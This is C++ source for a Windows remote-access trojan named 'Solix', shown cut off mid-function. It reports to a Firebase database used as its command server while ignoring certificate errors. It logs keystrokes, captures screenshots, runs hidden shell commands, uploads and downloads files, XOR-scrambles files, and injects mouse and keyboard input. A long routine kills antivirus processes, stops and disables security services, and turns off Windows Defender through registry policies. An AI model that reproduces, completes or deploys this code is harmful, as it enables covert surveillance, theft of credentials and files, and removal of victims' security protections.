#include <iostream>
#include <string>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <gdiplus.h>
#include <vfw.h>
#include <sstream>
#include <fstream>
#include <shlobj.h>
#include <algorithm>
#include <cctype>
#include <wincrypt.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
using namespace std;
using namespace Gdiplus;

string computerName;
string publicIP;
bool g_noPing = false;
int g_liveQuality = 25;
float g_liveScale = 0.5f;
int g_liveMonitor = 0;
bool g_serverSSL = true;
string g_serverHost = "lucaaverij-default-rtdb.europe-west1.firebasedatabase.app";
int g_serverPort = 443;
bool g_keylogRunning = false;
vector<string> g_keylogBuffer;
CRITICAL_SECTION g_keylogLock;
HHOOK g_keylogHook = NULL;

string getComputerName() {
    char buf[64]; DWORD sz = sizeof(buf);
    if (GetComputerNameA(buf, &sz)) return buf;
    return "unknown";
}

string getTimestamp() {
    SYSTEMTIME st; GetLocalTime(&st);
    char buf[32]; sprintf(buf, "%04d-%02d-%02dT%02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return buf;
}

string winhttpRequest(const wstring& method, const string& path, const string& body = "", bool isGet = false) {
    for (int attempt = 0; attempt < 3; attempt++) {
        try {
            HINTERNET s = WinHttpOpen(L"Solix/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
            if (!s) continue;
            HINTERNET c = WinHttpConnect(s, wstring(g_serverHost.begin(), g_serverHost.end()).c_str(), g_serverPort, 0);
            if (!c) { WinHttpCloseHandle(s); continue; }
            wstring wpath(path.begin(), path.end());
            DWORD flags = g_serverSSL ? WINHTTP_FLAG_SECURE : 0;
            HINTERNET r = WinHttpOpenRequest(c, method.c_str(), wpath.c_str(), 0, 0, 0, flags);
            if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); continue; }
            if (g_serverSSL) {
                DWORD opts = SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                             SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
                WinHttpSetOption(r, WINHTTP_OPTION_SECURITY_FLAGS, &opts, sizeof(opts));
            }
            wstring hdr = L"Content-Type: application/json\r\n";
            BOOL ok;
            if (isGet) {
                ok = WinHttpSendRequest(r, L"", -1, 0, 0, 0, 0);
            } else {
                ok = WinHttpSendRequest(r, hdr.c_str(), -1, (LPVOID)body.c_str(), body.size(), body.size(), 0);
            }
            if (!ok) { WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s); continue; }
            if (!WinHttpReceiveResponse(r, 0)) { WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s); continue; }
            string out; DWORD n; char buf[256];
            while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n] = 0; out += buf; }
            WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
            return out;
        } catch(...) { Sleep(500); }
    }
    return "";
}

string httpsGet(const string& path) { return winhttpRequest(L"GET", path, "", true); }
string httpsPut(const string& path, const string& body) { return winhttpRequest(L"PUT", path, body, false); }
string httpsPatch(const string& path, const string& body) { return winhttpRequest(L"PATCH", path, body, false); }
string httpsDelete(const string& path) { return winhttpRequest(L"DELETE", path, "", false); }
string httpsPost(const string& path, const string& body) { return winhttpRequest(L"POST", path, body, false); }

string getPublicIP() {
    auto s = WinHttpOpen(L"Solix/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, 0, 0, 0);
    if (!s) return "0.0.0.0";
    auto c = WinHttpConnect(s, L"api.ipify.org", 80, 0);
    if (!c) { WinHttpCloseHandle(s); return "0.0.0.0"; }
    auto r = WinHttpOpenRequest(c, L"GET", L"/", 0, 0, 0, 0);
    if (!r) { WinHttpCloseHandle(c); WinHttpCloseHandle(s); return "0.0.0.0"; }
    WinHttpSendRequest(r, 0, 0, 0, 0, 0, 0);
    WinHttpReceiveResponse(r, 0);
    string out; DWORD n; char buf[256];
    while (WinHttpReadData(r, buf, 255, &n) && n > 0) { buf[n] = 0; out += buf; }
    WinHttpCloseHandle(r); WinHttpCloseHandle(c); WinHttpCloseHandle(s);
    if (!out.empty() && out[0] == '{') return "0.0.0.0";
    return out;
}

string fbEsc(const string& s) {
    string r;
    for (char c : s) {
        if (c == '.' || c == '#' || c == '$' || c == '[' || c == ']') { r += '%'; char h[3]; sprintf(h, "%02X", (unsigned char)c); r += h; }
        else r += c;
    }
    return r;
}

string jsonEscape(const string& s) {
    string r;
    for (char c : s) {
        if (c == '"') r += "\\\"";
        else if (c == '\\') r += "\\\\";
        else if (c == '\n') r += "\\n";
        else if (c == '\r') r += "\\r";
        else if (c == '\t') r += "\\t";
        else if ((unsigned char)c < 32) { char h[7]; sprintf(h, "\\u%04X", (unsigned char)c); r += h; }
        else r += c;
    }
    return r;
}

string extractJson(const string& json, const string& key) {
    string search = "\"" + key + "\":\"";
    size_t p = json.find(search);
    if (p == string::npos) { search = "\"" + key + "\":"; p = json.find(search); if (p == string::npos) return ""; }
    p = json.find('"', p + search.size() - (json[p + search.size() - 1] == '"' ? 1 : 0));
    if (p == string::npos) return "";
    string r;
    for (size_t i = (json[p] == '"' ? p + 1 : p); i < json.size(); i++) {
        if (json[i] == '"' && (i == 0 || json[i-1] != '\\')) break;
        if (json[i] == '\\' && i + 1 < json.size()) { i++; if (json[i] == 'n') r += '\n'; else if (json[i] == 'r') r += '\r'; else if (json[i] == 't') r += '\t'; else r += json[i]; }
        else r += json[i];
    }
    return r;
}

string base64Encode(const unsigned char* data, size_t len) {
    static const char* tbl = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    string r; r.reserve((len + 2) / 3 * 4);
    for (size_t i = 0; i < len; i += 3) {
        unsigned b = ((unsigned)data[i] << 16) | (i + 1 < len ? (unsigned)data[i+1] << 8 : 0) | (i + 2 < len ? data[i+2] : 0);
        r += tbl[(b >> 18) & 0x3F]; r += tbl[(b >> 12) & 0x3F];
        r += (i + 1 < len) ? tbl[(b >> 6) & 0x3F] : '=';
        r += (i + 2 < len) ? tbl[b & 0x3F] : '=';
    }
    return r;
}

vector<unsigned char> base64Decode(const string& s) {
    static unsigned char tbl[256];
    static bool init = false;
    if (!init) {
        memset(tbl, 0x80, 256);
        for (int i = 0; i < 64; i++) tbl[(unsigned char)"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i]] = i;
        tbl[(unsigned char)'='] = 0;
        init = true;
    }
    vector<unsigned char> r;
    for (size_t i = 0; i < s.size(); i += 4) {
        if (s[i] == '=' || tbl[(unsigned char)s[i]] & 0x80) break;
        unsigned b = ((unsigned)tbl[(unsigned char)s[i]] << 18) |
                     ((unsigned)tbl[(unsigned char)s[i+1]] << 12) |
                     ((unsigned)tbl[(unsigned char)s[i+2]] << 6) |
                     (unsigned)tbl[(unsigned char)s[i+3]];
        r.push_back((b >> 16) & 0xFF);
        if (s[i+2] != '=') r.push_back((b >> 8) & 0xFF);
        if (s[i+3] != '=') r.push_back(b & 0xFF);
    }
    return r;
}

struct MonInfo { int x, y, w, h; };
int enumMon(HMONITOR m, HDC, RECT* r, LPARAM lp) {
    auto* v = (vector<MonInfo>*)lp;
    v->push_back({(int)r->left, (int)r->top, (int)(r->right - r->left), (int)(r->bottom - r->top)});
    return 1;
}
vector<MonInfo> getMonitors() {
    vector<MonInfo> v;
    EnumDisplayMonitors(0, 0, enumMon, (LPARAM)&v);
    return v;
}

static HBITMAP g_captureBMP = NULL;
static int g_captureW = 0, g_captureH = 0;

static void ensureCaptureBuf(int w, int h) {
    if (g_captureBMP && g_captureW >= w && g_captureH >= h) return;
    if (g_captureBMP) DeleteObject(g_captureBMP);
    HDC dc = GetDC(0);
    g_captureBMP = CreateCompatibleBitmap(dc, w, h);
    g_captureW = w; g_captureH = h;
    ReleaseDC(0, dc);
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
    UINT num=0, sz=0;
    GetImageEncodersSize(&num, &sz);
    if(sz==0) return 0;
    ImageCodecInfo* p=(ImageCodecInfo*)(malloc(sz));
    if(!p) return 0;
    GetImageEncoders(num, sz, p);
    for(UINT i=0;i<num;i++){if(wcscmp(p[i].MimeType, format)==0){*pClsid=p[i].Clsid;free(p);return 1;}}
    free(p); return 0;
}

static string jpegEncode(Bitmap* bmp, int quality = 85) {
    CLSID clsid;
    if (GetEncoderClsid(L"image/jpeg", &clsid) != 1) return "";
    IStream* st = NULL;
    if (CreateStreamOnHGlobal(NULL, TRUE, &st) != S_OK) return "";
    EncoderParameters eps; eps.Count = 1;
    eps.Parameter[0].Guid = EncoderQuality;
    eps.Parameter[0].Type = EncoderParameterValueTypeLong;
    eps.Parameter[0].NumberOfValues = 1;
    UINT q = quality;
    eps.Parameter[0].Value = &q;
    bmp->Save(st, &clsid, &eps);
    HGLOBAL hg = NULL;
    GetHGlobalFromStream(st, &hg);
    size_t sz = GlobalSize(hg);
    char* p = (char*)GlobalLock(hg);
    string r = base64Encode((unsigned char*)p, sz);
    GlobalUnlock(hg);
    st->Release();
    return r;
}

struct ScreenRect { int x, y, w, h; };

static ScreenRect getScreenRect(int monitorIdx) {
    auto mons = getMonitors();
    if (monitorIdx >= 0 && monitorIdx < (int)mons.size()) return {mons[monitorIdx].x, mons[monitorIdx].y, mons[monitorIdx].w, mons[monitorIdx].h};
    return {0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN)};
}

static inline int imax(int a, int b) { return a > b ? a : b; }

static string captureToBase64(int monitorIdx, float scale, int quality) {
    auto sr = getScreenRect(monitorIdx);
    int sw = sr.w, sh = sr.h;
    int dw = imax(1, (int)(sw * scale)), dh = imax(1, (int)(sh * scale));
    HDC dc = GetDC(0);
    HDC mdc = CreateCompatibleDC(dc);
    ensureCaptureBuf(dw, dh);
    HBITMAP old = (HBITMAP)SelectObject(mdc, g_captureBMP);
    SetStretchBltMode(mdc, HALFTONE);
    StretchBlt(mdc, 0, 0, dw, dh, dc, sr.x, sr.y, sw, sh, SRCCOPY);
    SelectObject(mdc, old);
    DeleteDC(mdc);
    ReleaseDC(0, dc);
    Bitmap bmp(g_captureBMP, (HPALETTE)0);
    return jpegEncode(&bmp, quality);
}

string takeScreenshot(int monitorIdx) { return captureToBase64(monitorIdx, 1.0f, 90); }

string captureWebcam() {
    return "webcam not supported";
}

string execCmd(const string& cmd) {
    SECURITY_ATTRIBUTES sa = {sizeof(sa), 0, 1};
    HANDLE rR = NULL, rW = NULL;
    CreatePipe(&rR, &rW, &sa, 0);
    STARTUPINFOA si = {sizeof(si)}; si.dwFlags = STARTF_USESTDHANDLES; si.hStdOutput = rW; si.hStdError = rW;
    PROCESS_INFORMATION pi;
    string full = "cmd.exe /c " + cmd;
    if (!CreateProcessA(NULL, &full[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(rR); CloseHandle(rW); return "err";
    }
    CloseHandle(pi.hThread);
    string out; char buf[256]; DWORD n;
    while (ReadFile(rR, buf, 255, &n, NULL) && n > 0) { buf[n] = 0; out += buf; }
    CloseHandle(rW); CloseHandle(rR);
    WaitForSingleObject(pi.hProcess, 5000);
    CloseHandle(pi.hProcess);
    return out;
}

string listDir(const string& path) {
    string searchPath = path.empty() ? "." : path;
    string norm = searchPath;
    if (norm.back() != '\\') norm += "\\";
    string spec = norm + "*";
    string out = "[";
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(spec.c_str(), &fd);
    if (h != INVALID_HANDLE_VALUE) {
        do {
            if (out.size() > 1) out += ",";
            out += "{\"n\":\"" + jsonEscape(fd.cFileName) + "\",\"s\":" + to_string(fd.nFileSizeLow) + ",\"d\":" + (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY ? "true" : "false") + "}";
        } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
    out += "]";
    return out;
}

string fileDelete(const string& path) {
    if (DeleteFileA(path.c_str())) return "ok";
    SetFileAttributesA(path.c_str(), FILE_ATTRIBUTE_NORMAL);
    return DeleteFileA(path.c_str()) ? "ok" : "err";
}

string fileRename(const string& payload) {
    size_t sep = payload.find("|||");
    if (sep == string::npos) return "bad_format";
    string src = payload.substr(0, sep), dst = payload.substr(sep + 3);
    return MoveFileA(src.c_str(), dst.c_str()) ? "ok" : "err";
}

string fileEncrypt(const string& path) {
    if (path.empty()) return "no_path";
    ifstream f(path, ios::binary);
    if (!f) return "err";
    vector<char> data((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
    f.close();
    for (auto& c : data) c ^= 0xFF;
    ofstream o(path, ios::binary);
    if (!o) return "err";
    o.write(data.data(), data.size());
    o.close();
    return "ok";
}

string fileDecrypt(const string& path) {
    return fileEncrypt(path);
}

string fileUpload(const string& payload) {
    size_t sep = payload.find("|||");
    if (sep == string::npos) return "bad_format";
    string path = payload.substr(0, sep);
    string data = payload.substr(sep + 3);
    auto bin = base64Decode(data);
    ofstream f(path, ios::binary);
    if (!f) return "err";
    f.write((char*)bin.data(), bin.size());
    f.close();
    return "ok";
}

string fileDownload(const string& path) {
    ifstream f(path, ios::binary);
    if (!f) return "err";
    vector<char> data((istreambuf_iterator<char>(f)), istreambuf_iterator<char>());
    f.close();
    return base64Encode((unsigned char*)data.data(), data.size());
}

string clipboardWrite(const string& text) {
    if (!OpenClipboard(0)) return "err";
    EmptyClipboard();
    HGLOBAL h = GlobalAlloc(GMEM_MOVEABLE, text.size() + 1);
    if (h) { memcpy(GlobalLock(h), text.c_str(), text.size() + 1); GlobalUnlock(h); SetClipboardData(CF_TEXT, h); }
    CloseClipboard();
    return "ok";
}

LRESULT CALLBACK keylogProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* hs = (KBDLLHOOKSTRUCT*)lParam;
        EnterCriticalSection(&g_keylogLock);
        char buf[32];
        if (hs->vkCode >= 0x30 && hs->vkCode <= 0x5A) {
            BYTE ks[256]; GetKeyboardState(ks);
            WORD c; ToAscii(hs->vkCode, hs->scanCode, ks, &c, 0);
            buf[0] = (char)c; buf[1] = 0;
        } else if (hs->vkCode == VK_RETURN) strcpy(buf, "[ENTER]");
        else if (hs->vkCode == VK_BACK) strcpy(buf, "[BACK]");
        else if (hs->vkCode == VK_TAB) strcpy(buf, "[TAB]");
        else if (hs->vkCode == VK_SHIFT) strcpy(buf, "[SHIFT]");
        else if (hs->vkCode == VK_CONTROL) strcpy(buf, "[CTRL]");
        else if (hs->vkCode == VK_ESCAPE) strcpy(buf, "[ESC]");
        else if (hs->vkCode == VK_SPACE) strcpy(buf, " ");
        else { sprintf(buf, "[%02X]", hs->vkCode); }
        g_keylogBuffer.push_back(buf);
        if (g_keylogBuffer.size() > 500) g_keylogBuffer.erase(g_keylogBuffer.begin());
        LeaveCriticalSection(&g_keylogLock);
    }
    return CallNextHookEx(0, nCode, wParam, lParam);
}

string startKeylog() {
    if (g_keylogRunning) return "already";
    InitializeCriticalSection(&g_keylogLock);
    g_keylogHook = SetWindowsHookA(WH_KEYBOARD_LL, keylogProc);
    g_keylogRunning = g_keylogHook != NULL;
    return g_keylogRunning ? "ok" : "err";
}

string stopKeylog() {
    if (!g_keylogRunning) return "not_running";
    if (g_keylogHook) UnhookWindowsHookEx(g_keylogHook);
    g_keylogHook = NULL; g_keylogRunning = false;
    return "ok";
}

string dumpKeylog() {
    EnterCriticalSection(&g_keylogLock);
    string r;
    for (auto& s : g_keylogBuffer) r += s;
    g_keylogBuffer.clear();
    LeaveCriticalSection(&g_keylogLock);
    return r.empty() ? "empty" : r;
}

string getHostInfo() {
    string r;
    char buf[256]; DWORD sz = sizeof(buf);
    if (GetComputerNameA(buf, &sz)) { r += "PC:" + string(buf) + "\n"; }
    sz = sizeof(buf); if (GetUserNameA(buf, &sz)) { r += "User:" + string(buf) + "\n"; }
    r += "OS:Windows\n";
    OSVERSIONINFOA oi = {sizeof(oi)}; GetVersionExA(&oi);
    r += "Ver:" + to_string(oi.dwMajorVersion) + "." + to_string(oi.dwMinorVersion) + "\n";
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    r += "RAM:" + to_string(ms.ullTotalPhys / 1024 / 1024) + "MB\n";
    r += "IP:" + publicIP + "\n";
    return r;
}

string getEnvVars() {
    string r;
    LPCH env = GetEnvironmentStringsA();
    if (env) {
        for (LPCH e = env; *e; e += strlen(e) + 1) { r += e; r += "\n"; }
        FreeEnvironmentStringsA(env);
    }
    return r;
}

string handleMouse(const string& payload) {
    size_t c1 = payload.find(','), c2 = payload.rfind(',');
    if (c1 == string::npos) return "bad";
    int x = stoi(payload.substr(0, c1));
    int y = c2 == c1 ? stoi(payload.substr(c1 + 1)) : stoi(payload.substr(c1 + 1, c2 - c1 - 1));
    string action = c2 == c1 ? "move" : payload.substr(c2 + 1);
    if (action == "move") SetCursorPos(x, y);
    else if (action == "click" || action == "left") { SetCursorPos(x, y); mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); Sleep(50); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); }
    else if (action == "right") { SetCursorPos(x, y); mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0); Sleep(50); mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0); }
    else if (action == "double") { SetCursorPos(x, y); mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); Sleep(50); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); Sleep(50); mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0); Sleep(50); mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0); }
    else if (action == "down") mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
    else if (action == "up") mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
    else return "unknown_action";
    return "ok";
}

string handleKeyboard(const string& payload) {
    for (char c : payload) {
        INPUT ip = {INPUT_KEYBOARD};
        WORD vk = VkKeyScanA(c);
        ip.ki.wVk = vk & 0xFF;
        if (vk & 0x100) { ip.ki.dwFlags = 0; SendInput(1, &ip, sizeof(INPUT)); }
        ip.ki.dwFlags = 0; SendInput(1, &ip, sizeof(INPUT));
        ip.ki.dwFlags = KEYEVENTF_KEYUP; SendInput(1, &ip, sizeof(INPUT));
        if (vk & 0x100) { ip.ki.wVk = VK_SHIFT; ip.ki.dwFlags = KEYEVENTF_KEYUP; SendInput(1, &ip, sizeof(INPUT)); }
        Sleep(10);
    }
    return "ok";
}

void sendPing() {
    string body = "{\"ts\":\"" + getTimestamp() + "\",\"ip\":\"" + jsonEscape(publicIP) + "\"}";
    httpsPut("/clients/" + fbEsc(computerName) + ".json", body);
}

string listProcesses() {
    string r = "[";
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            do {
                if (r.size() > 1) r += ",";
                r += "{\"n\":\"" + jsonEscape(pe.szExeFile) + "\",\"p\":" + to_string(pe.th32ProcessID) + "}";
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    r += "]";
    return r;
}

string killProcess(const string& payload) {
    DWORD pid = 0;
    try { pid = stoul(payload); } catch(...) { return "bad_pid"; }
    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!h) return "err";
    TerminateProcess(h, 1);
    CloseHandle(h);
    return "ok";
}

string getSystemInfo() {
    string r;
    r += "Computer: " + computerName + "\n";
    r += "IP: " + publicIP + "\n";
    r += "Time: " + getTimestamp() + "\n";
    OSVERSIONINFOA oi = {sizeof(oi)}; GetVersionExA(&oi);
    r += "OS: " + to_string(oi.dwMajorVersion) + "." + to_string(oi.dwMinorVersion) + " build " + to_string(oi.dwBuildNumber) + "\n";
    MEMORYSTATUSEX ms = {sizeof(ms)}; GlobalMemoryStatusEx(&ms);
    r += "RAM: " + to_string(ms.ullTotalPhys / 1024 / 1024) + "MB total, " + to_string(ms.ullAvailPhys / 1024 / 1024) + "MB free\n";
    char buf[256]; DWORD sz = sizeof(buf);
    if (GetUserNameA(buf, &sz)) r += "User: " + string(buf) + "\n";
    SYSTEM_INFO si; GetSystemInfo(&si);
    r += "CPU cores: " + to_string(si.dwNumberOfProcessors) + "\n";
    r += "Arch: " + string(si.wProcessorArchitecture == 9 ? "x64" : si.wProcessorArchitecture == 0 ? "x86" : "?") + "\n";
    return r;
}

string screenshotAll() {
    auto mons = getMonitors();
    string r = "[";
    for (int i = 0; i < (int)mons.size(); i++) {
        if (i > 0) r += ",";
        r += "\"" + takeScreenshot(i) + "\"";
    }
    r += "]";
    return r;
}

string setWallpaper(const string& path) {
    if (SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)path.c_str(), SPIF_UPDATEINIFILE)) return "ok";
    return "err";
}

string processKillName(const string& name) {
    string r;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = {sizeof(pe)};
        if (Process32First(snap, &pe)) {
            do {
                if (name == pe.szExeFile) {
                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                    if (h) { TerminateProcess(h, 1); CloseHandle(h); r += to_string(pe.th32ProcessID) + ","; }
                }
            } while (Process32Next(snap, &pe));
        }
        CloseHandle(snap);
    }
    return r.empty() ? "not_found" : "killed:" + r;
}

string getNetworkInfo() {
    string r;
    IP_ADAPTER_INFO ai[16];
    DWORD sz = sizeof(ai);
    if (GetAdaptersInfo(ai, &sz) == NO_ERROR) {
        for (auto* a = ai; a; a = a->Next) {
            r += string(a->Description) + "\n";
            r += "  IP: " + string(a->IpAddressList.IpAddress.String) + "\n";
            char mac[32]; sprintf(mac, "%02X-%02X-%02X-%02X-%02X-%02X", a->Address[0], a->Address[1], a->Address[2], a->Address[3], a->Address[4], a->Address[5]);
            r += "  MAC: " + string(mac) + "\n";
        }
    }
    return r;
}

string getServices() { return execCmd("sc query state= all"); }
string getInstalledApps() { return execCmd("wmic product get name,version"); }

void killProcessByName(const char* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe = {sizeof(pe)};
    if (Process32First(snap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, name) == 0) {
                HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                if (h) { TerminateProcess(h, 1); CloseHandle(h); }
            }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
}

void disableAntivirus() {
    const char* avProcs[] = {
        "MsMpEng.exe","MSASCui.exe","msseces.exe","NisSrv.exe","SecurityHealthService.exe",
        "avguard.exe","avgnt.exe","avscan.exe","AVGSvc.exe","avp.exe","avpui.exe",
        "bdagent.exe","bdss.exe","bdsvc.exe","ccSvcHst.exe","clamscan.exe","clamd.exe",
        "cmdagent.exe","ekrn.exe","egui.exe","eguiProxy.exe","escanh.exe","escansvc.exe",
        "f-secure.exe","fsav32.exe","fsdfwd.exe","fsm32.exe","fsorsp.exe","fssm32.exe",
        "gupd.exe","gupdate.exe","kavfs.exe","kavsvc.exe","klnagent.exe","knsvc.exe",
        "kavfm.exe","kav32.exe","mcshield.exe","mcs.exe","mcods.exe","mfeann.exe",
        "mfefire.exe","mfehidin.exe","mfemms.exe","mfevtps.exe","mpcmdrun.exe","MpCopyAccelerator.exe",
        "msmpeng.exe","n360.exe","navw32.exe","nis.exe","nisol.exe","nod32krn.exe","nod32kui.exe",
        "norton.exe","NsCfg.exe","osLag.exe","pav.exe","pavs.exe","pavsrv.exe",
        "pavprot.exe","pccguide.exe","pccnt.exe","pccntmon.exe","pcfw.exe","persfw.exe",
        "prevsrv.exe","protect.exe","PSafe.exe","psctrls.exe","pxserver.exe","QuickHeal.exe",
        "safebox.exe","sav32.exe","savadminsrv.exe","savmain.exe","savservice.exe","sbserv.exe",
        "scan32.exe","sched.exe","seccenter.exe","shstat.exe","smax4pnp.exe","smc.exe",
        "smcgui.exe","Snooper.exe","spbbcsvc.exe","spider.exe","spidernt.exe","spybot.exe",
        "srvany.exe","STOPzilla.exe","stopsign.exe","symlcsvc.exe","symwsc.exe","syncln.exe",
        "sysupd.exe","tfak.exe","tis.exe","tisck.exe","tmccsf.exe","tmproxy.exe","TMBMSRV.exe",
        "tmntsrv.exe","tmpfw.exe","trend.exe","U_S.E_0001.exe","upd.exe","update.exe",
        "V3Svc.exe","vbcmserv.exe","vbcons.exe","vbwin9x.exe","vbwinnt.exe","vet.exe",
        "vettray.exe","vfshell.exe","vmscan.exe","vrfwsvc.exe","vstskmgr.exe","vsserv.exe",
        "vswin9x.exe","vswinnt.exe","wavsyn9x.exe","webscanx.exe","WinPatrol.exe","WksCalib.exe",
        "XCOMM.EXE","Zanda.exe","zonefix.exe","ZONEALARM.exe","zlclient.exe","A2CMD.exe",
        "a2service.exe","a2scan.exe","AD-aware.exe","AdAware.exe","Ad-Aware.exe","AdWatcher.exe",
        "Agnitum.exe","AgntUpd.exe","Antivirus.exe","AntiVir.exe","ARGuard.exe","asDwnSrv.exe",
        "asHmSrv.exe","asLblSrv.exe","asMailSrv.exe","asPstSrv.exe","asUpdSrv.exe","aswEngSrv.exe",
        "aswMBR.exe","aswRdr.exe","aswSnx.exe","aswSpSrv.exe","aswUpdSv.exe","avast.exe",
        "AvastEmUpdate.exe","AvastSvc.exe","avastui.exe","avg.exe","avgamsvr.exe","avgcc.exe",
        "avgemc.exe","avgidsagent.exe","avgrsx.exe","avgServ.exe","avgwdsvc.exe","Avira.Systray.exe",
        "avscan.exe","AvShadow.exe","AvUpdSvc.exe","AvVet.exe","AvWav.exe","AvX.exe",
        "avz.exe","backup.exe","bav.exe","bavscan.exe","BDFCore.exe","BdDesktop.exe",
        "BdSvc.exe","BdUISvc.exe","bitdefender.exe","bits.exe","Bkav.exe","BkavSrv.exe",
        NULL
    };
    for (int i = 0; avProcs[i]; i++) killProcessByName(avProcs[i]);
    const char* avSvcs[] = {
        "WinDefend","SecurityHealthService","Sense","WdBoot","WdFilter","WdNisDrv","WdNisSvc",
        "windefend","MSASCui","mssecess","AVP","AVG Antivirus","Avast Antivirus","avast! Antivirus",
        "McAfee McShield","McAfee Framework","Norton AntiVirus","Norton Security","Norton 360",
        "BitDefender","BitDefender Arrakis Server","Kaspersky Anti-Virus","Kaspersky Security Center",
        "KAVFS","KAVFS_KAVFSGT","ESET Service","ESET HTTP Server","ESET Security",
        "F-Secure Network","F-Secure ORSP Client","F-Secure Policy Manager","F-Secure Anti-Virus",
        "Malwarebytes","MBAMService","MBAMScheduler","Panda","PsShield","Sophos",
        "Trend Micro","Trend Micro Proxy","Trend Micro NT","VBA32","ZoneAlarm",
        "AdAware","AhnLab","Agnitum","ALYac","Antiy","Arcavir","ArcaVir","Avira",
        "AVZ","Baikal","Baidu Antivirus","BullGuard","CGW","ClamAV","Comodo",
        "COMODO Internet Security","DrWeb","Dr.Web","eScan","Fortinet","F-PROT",
        "Frisk","G Data","GRIZZLY","Hauri","H+BEDV","Ikarus","IKARUS","Invincea",
        "Iobit","IObit","Jiangmin","K7","Kingsoft","Lavasoft","Lavasoft Ad-Aware",
        "MWAV","MWAVSD","NAV","NOD32","Norman","Norton","Online Solutions","Outpost",
        "Panda Security","PC Matic","PCCW","Personal","Quick Heal","Rising","Rising Antivirus",
        "RTPatch","SecureAnywhere","SG","SHIELD","Smax","Sophos Anti-Virus","Spybot",
        "Spyware Terminator","Sygate","Symantec","TA","Tencent","ThreatTrack","Total Defense",
        "Trapmine","TrustPort","V3","Vipre","VIPRE","VirusBlokAda","VirusBuster","Webroot",
        "WFP","WRSA","Zillya","ZONEALARM","Zoner"
    };
    for (int i = 0; i < sizeof(avSvcs)/sizeof(avSvcs[0]); i++) {
        string cmd = string("net stop ") + avSvcs[i] + " 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
        cmd = string("sc stop ") + avSvcs[i] + " 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
        cmd = string("sc config ") + avSvcs[i] + " start= disabled 2>nul";
        WinExec(cmd.c_str(), SW_HIDE);
    }
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        DWORD v = 1; RegSetValueExA(k, "DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&v, sizeof(v)); RegCloseKey(k);
    }
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 0, KEY_SET_VALUE, &k) == ERROR_SUCCESS) {
        DWORD v = 1; RegSetValueExA(k, "DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExA(k, "DisableIOAVProtection", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExA(k, "DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegSetValueExA(k, "DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&v, sizeof(v));
        RegCloseKey(k);
    }
